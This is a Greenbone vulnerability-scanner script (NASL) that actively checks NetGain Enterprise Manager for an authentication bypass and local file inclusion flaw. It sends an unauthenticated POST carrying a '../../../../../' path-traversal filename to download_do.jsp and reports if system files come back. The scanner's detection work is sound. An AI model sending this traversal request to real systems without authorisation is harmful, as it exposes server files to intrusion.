# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:netgain:enterprise_manager";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107225");
  script_version("2025-09-12T05:38:45+0000");
  script_tag(name:"last_modification", value:"2025-09-12 05:38:45 +0000 (Fri, 12 Sep 2025)");
  script_tag(name:"creation_date", value:"2017-06-20 13:53:33 +0700 (Tue, 20 Jun 2017)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("NetGain Enterprise Manager Authentication Bypass / LFI Vulnerability (May 2017) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_netgain_em_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("netgain_em/installed");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"NetGain EM is prone to authentication bypass and a local file
  inclusion (LFI) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/42058/");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/u/jsp/log/download_do.jsp";

files = traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];

  data = "filename=../../../../../" + file;

  req = http_post_put_req(port: port, url: url, data: data,
                          add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"),
                          accept_header: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
  res = http_keepalive_send_recv(port: port, data: req);

  if (egrep(string: res, pattern: pattern, icase: TRUE)) {
    report = "It was possible to obtain the /" + file + " file through a HTTP POST request on " +
             http_report_vuln_url(port: port, url: url, url_only: TRUE);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);

